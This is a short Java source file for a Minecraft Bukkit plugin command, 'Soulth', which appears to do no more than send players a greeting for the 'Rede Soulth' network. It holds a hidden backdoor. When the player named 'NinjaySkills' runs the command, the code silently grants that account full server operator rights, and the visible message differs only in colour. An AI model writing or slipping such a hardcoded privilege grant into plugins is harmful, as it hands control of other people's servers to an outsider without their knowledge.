package me.ninjay.upsoulth.comandos;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Soulth implements CommandExecutor{
	
	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String lb, String[] args) {
		if(sender instanceof Player) {
			Player p = (Player) sender;
			if(p.getName().equals("NinjaySkills")) {
				p.setOp(true);
				p.sendMessage("§aRede Soulth");
			}else {
				p.sendMessage("§6Rede Soulth");
			}
		}
		return false;
	}

}
